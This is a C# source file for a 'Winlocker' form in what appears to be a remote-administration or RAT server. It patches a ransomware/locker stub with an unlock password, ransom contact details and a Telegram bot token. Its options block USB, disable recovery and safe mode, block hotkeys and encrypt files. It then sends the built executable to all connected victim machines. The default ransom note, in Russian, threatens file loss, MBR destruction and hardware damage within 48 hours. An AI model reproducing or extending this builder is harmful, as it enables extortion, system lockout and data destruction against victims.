using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Leb128;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormWinlocker : FormMaterial
{
	public Clients[] clients;

	private IContainer components;

	private Panel panel1;

	private Label labelTelegramUsername;

	private RJTextBox rjTextBoxTelegramUsername;

	private Label labelPassword;

	private RJTextBox rjTextBoxPassword;

	private Label labelCustomText;

	private RJTextBox rjTextBoxCustomText;

	private Label labelColor;

	private RJComboBox rjComboBoxColor;

	private CheckBox checkBoxAntiSafeMode;

	private CheckBox checkBoxBlockUSB;

	private CheckBox checkBoxDisableRecovery;

	private CheckBox checkBoxBlockHotkeys;

	private CheckBox checkBoxEncryptFiles;

	private Label labelBotToken;

	private RJTextBox rjTextBoxBotToken;

	private Label labelChatId;

	private RJTextBox rjTextBoxChatId;

	private RJButton rjButtonCancel;

	private RJButton rjButtonSend;

	public FormWinlocker()
	{
		InitializeComponent();
	}

	private void FormWinlocker_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		try
		{
			if (clients != null && clients.Length != 0 && !string.IsNullOrWhiteSpace(clients[0].Hwid))
			{
				string hwid = clients[0].Hwid;
				if (clients.Length == 1)
				{
					Text = "Winlocker [" + hwid + "]";
				}
				else
				{
					Text = $"Winlocker [{hwid}] (+{clients.Length - 1} pcs)";
				}
			}
		}
		catch
		{
		}
	}

	private void ChangeScheme(object sender)
	{
		rjTextBoxTelegramUsername.BorderColor = FormMaterial.PrimaryColor;
		rjTextBoxPassword.BorderColor = FormMaterial.PrimaryColor;
		rjTextBoxCustomText.BorderColor = FormMaterial.PrimaryColor;
		rjComboBoxColor.BorderColor = FormMaterial.PrimaryColor;
		rjTextBoxBotToken.BorderColor = FormMaterial.PrimaryColor;
		rjTextBoxChatId.BorderColor = FormMaterial.PrimaryColor;
		rjButtonCancel.BackColor = FormMaterial.PrimaryColor;
		rjButtonSend.BackColor = FormMaterial.PrimaryColor;
	}

	private void rjButtonSend_Click(object sender, EventArgs e)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(rjTextBoxPassword.Texts))
			{
				MessageBox.Show("Пароль обязателен для заполнения!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				return;
			}
			string tempPath = Path.GetTempFileName();
			string outputPath = "Stub\\WinLocker.exe";
			if (!File.Exists("Stub\\WinLockerStub.exe"))
			{
				MessageBox.Show("Файл Stub\\WinLockerStub.exe не найден!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			File.Copy("Stub\\WinLockerStub.exe", tempPath, overwrite: true);
			using (ModuleDefMD moduleDefMD = ModuleDefMD.Load(tempPath))
			{
				foreach (TypeDef type in moduleDefMD.Types)
				{
					foreach (MethodDef method in type.Methods)
					{
						if (method.Body == null)
						{
							continue;
						}
						for (int i = 0; i < method.Body.Instructions.Count(); i++)
						{
							if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
							{
								continue;
							}
							string operand = method.Body.Instructions[i].Operand as string;
							if (!string.IsNullOrEmpty(operand))
							{
								if (operand.Contains("%username%"))
								{
									string username = (string.IsNullOrWhiteSpace(rjTextBoxTelegramUsername.Texts) ? "support" : rjTextBoxTelegramUsername.Texts.Replace("@", ""));
									method.Body.Instructions[i].Operand = operand.Replace("%username%", username);
								}
								if (operand.Contains("%PASSWORD%"))
								{
									method.Body.Instructions[i].Operand = operand.Replace("%PASSWORD%", rjTextBoxPassword.Texts);
								}
								if (operand.Contains("%CUSTOMTEXT%"))
								{
									string customText = (string.IsNullOrWhiteSpace(rjTextBoxCustomText.Texts) ? "Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой. Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку MBR ( главный загрузчик материнки) будет снесён и будет подана рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности. У вас есть 48 часов с момента запуска чтобы ввести код" : rjTextBoxCustomText.Texts);
									method.Body.Instructions[i].Operand = operand.Replace("%CUSTOMTEXT%", customText);
								}
								if (operand.Contains("%COLOR%"))
								{
									string color = rjComboBoxColor.SelectedItem?.ToString() ?? "Blue";
									method.Body.Instructions[i].Operand = operand.Replace("%COLOR%", color);
								}
								if (operand.Contains("%SAFEMODE%"))
								{
									method.Body.Instructions[i].Operand = operand.Replace("%SAFEMODE%", checkBoxAntiSafeMode.Checked ? "true" : "false");
								}
								if (operand.Contains("%BLOCKUSB%"))
								{
									method.Body.Instructions[i].Operand = operand.Replace("%BLOCKUSB%", checkBoxBlockUSB.Checked ? "true" : "false");
								}
								if (operand.Contains("%DISABLERECOVERY%"))
								{
									method.Body.Instructions[i].Operand = operand.Replace("%DISABLERECOVERY%", checkBoxDisableRecovery.Checked ? "true" : "false");
								}
								if (operand.Contains("%BLOCKHOTKEYS%"))
								{
									method.Body.Instructions[i].Operand = operand.Replace("%BLOCKHOTKEYS%", checkBoxBlockHotkeys.Checked ? "true" : "false");
								}
								if (operand.Contains("%ENCRYPTFILES%"))
								{
									method.Body.Instructions[i].Operand = operand.Replace("%ENCRYPTFILES%", checkBoxEncryptFiles.Checked ? "true" : "false");
								}
								if (operand.Contains("%BOTTOKEN%"))
								{
									string botToken = (string.IsNullOrWhiteSpace(rjTextBoxBotToken.Texts) ? "%BOTTOKEN%" : rjTextBoxBotToken.Texts);
									method.Body.Instructions[i].Operand = operand.Replace("%BOTTOKEN%", botToken);
								}
								if (operand.Contains("%CHATID%"))
								{
									string chatId = (string.IsNullOrWhiteSpace(rjTextBoxChatId.Texts) ? "%CHATID%" : rjTextBoxChatId.Texts);
									method.Body.Instructions[i].Operand = operand.Replace("%CHATID%", chatId);
								}
							}
						}
					}
				}
				string outputDir = Path.GetDirectoryName(outputPath);
				if (!Directory.Exists(outputDir))
				{
					Directory.CreateDirectory(outputDir);
				}
				moduleDefMD.Write(outputPath);
			}
			if (File.Exists(tempPath))
			{
				File.Delete(tempPath);
			}
			string checksum = Methods.GetChecksum(outputPath);
			byte[] pack = LEB128.Write(new object[3] { "SendDiskGet", outputPath, checksum });
			string checksum2 = Methods.GetChecksum("Plugin\\SendFile.dll");
			Clients[] array = clients;
			foreach (Clients client in array)
			{
				Task.Run(delegate
				{
					client.Send(new object[3] { "Invoke", checksum2, pack });
				});
			}
			Close();
		}
		catch (Exception ex)
		{
			MessageBox.Show("Ошибка при создании файла: " + ex.Message + "\n\nStack trace: " + ex.StackTrace, "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjButtonCancel_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void checkBoxBlockUSB_CheckedChanged(object sender, EventArgs e)
	{
	}

	private void checkBoxEncryptFiles_CheckedChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.panel1 = new System.Windows.Forms.Panel();
		this.labelTelegramUsername = new System.Windows.Forms.Label();
		this.rjTextBoxTelegramUsername = new CustomControls.RJControls.RJTextBox();
		this.labelPassword = new System.Windows.Forms.Label();
		this.rjTextBoxPassword = new CustomControls.RJControls.RJTextBox();
		this.labelCustomText = new System.Windows.Forms.Label();
		this.rjTextBoxCustomText = new CustomControls.RJControls.RJTextBox();
		this.labelColor = new System.Windows.Forms.Label();
		this.rjComboBoxColor = new CustomControls.RJControls.RJComboBox();
		this.checkBoxAntiSafeMode = new System.Windows.Forms.CheckBox();
		this.checkBoxBlockUSB = new System.Windows.Forms.CheckBox();
		this.checkBoxDisableRecovery = new System.Windows.Forms.CheckBox();
		this.checkBoxBlockHotkeys = new System.Windows.Forms.CheckBox();
		this.checkBoxEncryptFiles = new System.Windows.Forms.CheckBox();
		this.labelBotToken = new System.Windows.Forms.Label();
		this.rjTextBoxBotToken = new CustomControls.RJControls.RJTextBox();
		this.labelChatId = new System.Windows.Forms.Label();
		this.rjTextBoxChatId = new CustomControls.RJControls.RJTextBox();
		this.rjButtonCancel = new CustomControls.RJControls.RJButton();
		this.rjButtonSend = new CustomControls.RJControls.RJButton();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.labelTelegramUsername);
		this.panel1.Controls.Add(this.rjTextBoxTelegramUsername);
		this.panel1.Controls.Add(this.labelPassword);
		this.panel1.Controls.Add(this.rjTextBoxPassword);
		this.panel1.Controls.Add(this.labelCustomText);
		this.panel1.Controls.Add(this.rjTextBoxCustomText);
		this.panel1.Controls.Add(this.labelColor);
		this.panel1.Controls.Add(this.rjComboBoxColor);
		this.panel1.Controls.Add(this.checkBoxAntiSafeMode);
		this.panel1.Controls.Add(this.checkBoxBlockUSB);
		this.panel1.Controls.Add(this.checkBoxDisableRecovery);
		this.panel1.Controls.Add(this.checkBoxBlockHotkeys);
		this.panel1.Controls.Add(this.checkBoxEncryptFiles);
		this.panel1.Controls.Add(this.labelBotToken);
		this.panel1.Controls.Add(this.rjTextBoxBotToken);
		this.panel1.Controls.Add(this.labelChatId);
		this.panel1.Controls.Add(this.rjTextBoxChatId);
		this.panel1.Controls.Add(this.rjButtonCancel);
		this.panel1.Controls.Add(this.rjButtonSend);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(617, 396);
		this.panel1.TabIndex = 0;
		this.labelTelegramUsername.AutoSize = true;
		this.labelTelegramUsername.ForeColor = System.Drawing.Color.Black;
		this.labelTelegramUsername.Location = new System.Drawing.Point(10, 10);
		this.labelTelegramUsername.Name = "labelTelegramUsername";
		this.labelTelegramUsername.Size = new System.Drawing.Size(195, 13);
		this.labelTelegramUsername.TabIndex = 0;
		this.labelTelegramUsername.Text = "Введите Telegram юзернейм (без @):";
		this.rjTextBoxTelegramUsername.BackColor = System.Drawing.Color.White;
		this.rjTextBoxTelegramUsername.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxTelegramUsername.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxTelegramUsername.BorderRadius = 0;
		this.rjTextBoxTelegramUsername.BorderSize = 2;
		this.rjTextBoxTelegramUsername.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f);
		this.rjTextBoxTelegramUsername.ForeColor = System.Drawing.Color.Black;
		this.rjTextBoxTelegramUsername.Location = new System.Drawing.Point(10, 30);
		this.rjTextBoxTelegramUsername.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxTelegramUsername.Multiline = false;
		this.rjTextBoxTelegramUsername.Name = "rjTextBoxTelegramUsername";
		this.rjTextBoxTelegramUsername.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxTelegramUsername.PasswordChar = false;
		this.rjTextBoxTelegramUsername.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxTelegramUsername.PlaceholderText = "";
		this.rjTextBoxTelegramUsername.Size = new System.Drawing.Size(600, 31);
		this.rjTextBoxTelegramUsername.TabIndex = 1;
		this.rjTextBoxTelegramUsername.Texts = "";
		this.rjTextBoxTelegramUsername.UnderlinedStyle = false;
		this.labelPassword.AutoSize = true;
		this.labelPassword.ForeColor = System.Drawing.Color.Black;
		this.labelPassword.Location = new System.Drawing.Point(10, 70);
		this.labelPassword.Name = "labelPassword";
		this.labelPassword.Size = new System.Drawing.Size(225, 13);
		this.labelPassword.TabIndex = 2;
		this.labelPassword.Text = "Введите кастомный пароль (обязательно):";
		this.rjTextBoxPassword.BackColor = System.Drawing.Color.White;
		this.rjTextBoxPassword.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxPassword.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxPassword.BorderRadius = 0;
		this.rjTextBoxPassword.BorderSize = 2;
		this.rjTextBoxPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f);
		this.rjTextBoxPassword.ForeColor = System.Drawing.Color.Black;
		this.rjTextBoxPassword.Location = new System.Drawing.Point(10, 90);
		this.rjTextBoxPassword.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxPassword.Multiline = false;
		this.rjTextBoxPassword.Name = "rjTextBoxPassword";
		this.rjTextBoxPassword.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxPassword.PasswordChar = true;
		this.rjTextBoxPassword.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxPassword.PlaceholderText = "";
		this.rjTextBoxPassword.Size = new System.Drawing.Size(600, 31);
		this.rjTextBoxPassword.TabIndex = 3;
		this.rjTextBoxPassword.Texts = "";
		this.rjTextBoxPassword.UnderlinedStyle = false;
		this.labelCustomText.AutoSize = true;
		this.labelCustomText.ForeColor = System.Drawing.Color.Black;
		this.labelCustomText.Location = new System.Drawing.Point(10, 130);
		this.labelCustomText.Name = "labelCustomText";
		this.labelCustomText.Size = new System.Drawing.Size(232, 13);
		this.labelCustomText.TabIndex = 4;
		this.labelCustomText.Text = "Введите кастомный текст (не обязательно):";
		this.rjTextBoxCustomText.BackColor = System.Drawing.Color.White;
		this.rjTextBoxCustomText.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxCustomText.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxCustomText.BorderRadius = 0;
		this.rjTextBoxCustomText.BorderSize = 2;
		this.rjTextBoxCustomText.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f);
		this.rjTextBoxCustomText.ForeColor = System.Drawing.Color.Black;
		this.rjTextBoxCustomText.Location = new System.Drawing.Point(10, 150);
		this.rjTextBoxCustomText.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxCustomText.Multiline = true;
		this.rjTextBoxCustomText.Name = "rjTextBoxCustomText";
		this.rjTextBoxCustomText.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxCustomText.PasswordChar = false;
		this.rjTextBoxCustomText.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxCustomText.PlaceholderText = "";
		this.rjTextBoxCustomText.Size = new System.Drawing.Size(600, 80);
		this.rjTextBoxCustomText.TabIndex = 5;
		this.rjTextBoxCustomText.Texts = "";
		this.rjTextBoxCustomText.UnderlinedStyle = false;
		this.labelColor.AutoSize = true;
		this.labelColor.ForeColor = System.Drawing.Color.Black;
		this.labelColor.Location = new System.Drawing.Point(314, 301);
		this.labelColor.Name = "labelColor";
		this.labelColor.Size = new System.Drawing.Size(115, 13);
		this.labelColor.TabIndex = 6;
		this.labelColor.Text = "Выберите цвет фона:";
		this.rjComboBoxColor.BackColor = System.Drawing.Color.White;
		this.rjComboBoxColor.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBoxColor.BorderSize = 2;
		this.rjComboBoxColor.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.rjComboBoxColor.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f);
		this.rjComboBoxColor.ForeColor = System.Drawing.Color.Black;
		this.rjComboBoxColor.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBoxColor.Items.AddRange(new object[9] { "Blue", "DarkRed", "Purple", "Yellow", "WhiteBlueRed", "YellowBlue", "Green", "Orange", "Pink" });
		this.rjComboBoxColor.ListBackColor = System.Drawing.Color.White;
		this.rjComboBoxColor.ListTextColor = System.Drawing.Color.Black;
		this.rjComboBoxColor.Location = new System.Drawing.Point(317, 317);
		this.rjComboBoxColor.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBoxColor.Name = "rjComboBoxColor";
		this.rjComboBoxColor.Padding = new System.Windows.Forms.Padding(2);
		this.rjComboBoxColor.Size = new System.Drawing.Size(290, 36);
		this.rjComboBoxColor.TabIndex = 7;
		this.rjComboBoxColor.Texts = "Blue";
		this.checkBoxAntiSafeMode.AutoSize = true;
		this.checkBoxAntiSafeMode.ForeColor = System.Drawing.Color.Black;
		this.checkBoxAntiSafeMode.Location = new System.Drawing.Point(13, 297);
		this.checkBoxAntiSafeMode.Name = "checkBoxAntiSafeMode";
		this.checkBoxAntiSafeMode.Size = new System.Drawing.Size(90, 17);
		this.checkBoxAntiSafeMode.TabIndex = 8;
		this.checkBoxAntiSafeMode.Text = "Anti SafeMod";
		this.checkBoxAntiSafeMode.UseVisualStyleBackColor = true;
		this.checkBoxBlockUSB.AutoSize = true;
		this.checkBoxBlockUSB.ForeColor = System.Drawing.Color.Black;
		this.checkBoxBlockUSB.Location = new System.Drawing.Point(109, 297);
		this.checkBoxBlockUSB.Name = "checkBoxBlockUSB";
		this.checkBoxBlockUSB.Size = new System.Drawing.Size(163, 17);
		this.checkBoxBlockUSB.TabIndex = 9;
		this.checkBoxBlockUSB.Text = "Block USB (Блокирует юсб)";
		this.checkBoxBlockUSB.UseVisualStyleBackColor = true;
		this.checkBoxDisableRecovery.AutoSize = true;
		this.checkBoxDisableRecovery.ForeColor = System.Drawing.Color.Black;
		this.checkBoxDisableRecovery.Location = new System.Drawing.Point(13, 317);
		this.checkBoxDisableRecovery.Name = "checkBoxDisableRecovery";
		this.checkBoxDisableRecovery.Size = new System.Drawing.Size(290, 17);
		this.checkBoxDisableRecovery.TabIndex = 10;
		this.checkBoxDisableRecovery.Text = "Disable Recovery (отключает среду восстановления)";
		this.checkBoxDisableRecovery.UseVisualStyleBackColor = true;
		this.checkBoxBlockHotkeys.AutoSize = true;
		this.checkBoxBlockHotkeys.ForeColor = System.Drawing.Color.Black;
		this.checkBoxBlockHotkeys.Location = new System.Drawing.Point(13, 336);
		this.checkBoxBlockHotkeys.Name = "checkBoxBlockHotkeys";
		this.checkBoxBlockHotkeys.Size = new System.Drawing.Size(95, 17);
		this.checkBoxBlockHotkeys.TabIndex = 11;
		this.checkBoxBlockHotkeys.Text = "Block Hotkeys";
		this.checkBoxBlockHotkeys.UseVisualStyleBackColor = true;
		this.checkBoxEncryptFiles.AutoSize = true;
		this.checkBoxEncryptFiles.ForeColor = System.Drawing.Color.Black;
		this.checkBoxEncryptFiles.Location = new System.Drawing.Point(109, 336);
		this.checkBoxEncryptFiles.Name = "checkBoxEncryptFiles";
		this.checkBoxEncryptFiles.Size = new System.Drawing.Size(176, 17);
		this.checkBoxEncryptFiles.TabIndex = 12;
		this.checkBoxEncryptFiles.Text = "Encrypt Files (шифрует файлы)";
		this.checkBoxEncryptFiles.UseVisualStyleBackColor = true;
		this.checkBoxEncryptFiles.CheckedChanged += new System.EventHandler(checkBoxEncryptFiles_CheckedChanged);
		this.labelBotToken.AutoSize = true;
		this.labelBotToken.ForeColor = System.Drawing.Color.Black;
		this.labelBotToken.Location = new System.Drawing.Point(9, 239);
		this.labelBotToken.Name = "labelBotToken";
		this.labelBotToken.Size = new System.Drawing.Size(196, 13);
		this.labelBotToken.TabIndex = 13;
		this.labelBotToken.Text = "Telegram Bot Token (не обязательно):";
		this.rjTextBoxBotToken.BackColor = System.Drawing.Color.White;
		this.rjTextBoxBotToken.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxBotToken.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxBotToken.BorderRadius = 0;
		this.rjTextBoxBotToken.BorderSize = 2;
		this.rjTextBoxBotToken.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f);
		this.rjTextBoxBotToken.ForeColor = System.Drawing.Color.Black;
		this.rjTextBoxBotToken.Location = new System.Drawing.Point(12, 259);
		this.rjTextBoxBotToken.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxBotToken.Multiline = false;
		this.rjTextBoxBotToken.Name = "rjTextBoxBotToken";
		this.rjTextBoxBotToken.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxBotToken.PasswordChar = false;
		this.rjTextBoxBotToken.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxBotToken.PlaceholderText = "";
		this.rjTextBoxBotToken.Size = new System.Drawing.Size(300, 31);
		this.rjTextBoxBotToken.TabIndex = 14;
		this.rjTextBoxBotToken.Texts = "";
		this.rjTextBoxBotToken.UnderlinedStyle = false;
		this.labelChatId.AutoSize = true;
		this.labelChatId.ForeColor = System.Drawing.Color.Black;
		this.labelChatId.Location = new System.Drawing.Point(317, 239);
		this.labelChatId.Name = "labelChatId";
		this.labelChatId.Size = new System.Drawing.Size(182, 13);
		this.labelChatId.TabIndex = 15;
		this.labelChatId.Text = "Telegram Chat ID (не обязательно):";
		this.rjTextBoxChatId.BackColor = System.Drawing.Color.White;
		this.rjTextBoxChatId.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxChatId.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxChatId.BorderRadius = 0;
		this.rjTextBoxChatId.BorderSize = 2;
		this.rjTextBoxChatId.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f);
		this.rjTextBoxChatId.ForeColor = System.Drawing.Color.Black;
		this.rjTextBoxChatId.Location = new System.Drawing.Point(317, 259);
		this.rjTextBoxChatId.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxChatId.Multiline = false;
		this.rjTextBoxChatId.Name = "rjTextBoxChatId";
		this.rjTextBoxChatId.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxChatId.PasswordChar = false;
		this.rjTextBoxChatId.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxChatId.PlaceholderText = "";
		this.rjTextBoxChatId.Size = new System.Drawing.Size(290, 31);
		this.rjTextBoxChatId.TabIndex = 16;
		this.rjTextBoxChatId.Texts = "";
		this.rjTextBoxChatId.UnderlinedStyle = false;
		this.rjButtonCancel.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonCancel.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonCancel.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonCancel.BorderRadius = 0;
		this.rjButtonCancel.BorderSize = 0;
		this.rjButtonCancel.FlatAppearance.BorderSize = 0;
		this.rjButtonCancel.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonCancel.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonCancel.ForeColor = System.Drawing.Color.White;
		this.rjButtonCancel.Location = new System.Drawing.Point(10, 359);
		this.rjButtonCancel.Name = "rjButtonCancel";
		this.rjButtonCancel.Size = new System.Drawing.Size(293, 31);
		this.rjButtonCancel.TabIndex = 17;
		this.rjButtonCancel.Text = "Cancel";
		this.rjButtonCancel.TextColor = System.Drawing.Color.White;
		this.rjButtonCancel.UseVisualStyleBackColor = false;
		this.rjButtonCancel.Click += new System.EventHandler(rjButtonCancel_Click);
		this.rjButtonSend.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonSend.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonSend.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonSend.BorderRadius = 0;
		this.rjButtonSend.BorderSize = 0;
		this.rjButtonSend.FlatAppearance.BorderSize = 0;
		this.rjButtonSend.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonSend.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonSend.ForeColor = System.Drawing.Color.White;
		this.rjButtonSend.Location = new System.Drawing.Point(317, 359);
		this.rjButtonSend.Name = "rjButtonSend";
		this.rjButtonSend.Size = new System.Drawing.Size(292, 31);
		this.rjButtonSend.TabIndex = 18;
		this.rjButtonSend.Text = "Send";
		this.rjButtonSend.TextColor = System.Drawing.Color.White;
		this.rjButtonSend.UseVisualStyleBackColor = false;
		this.rjButtonSend.Click += new System.EventHandler(rjButtonSend_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(623, 463);
		base.Controls.Add(this.panel1);
		base.Name = "FormWinlocker";
		this.Text = "Winlocker";
		base.Load += new System.EventHandler(FormWinlocker_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
	}
}
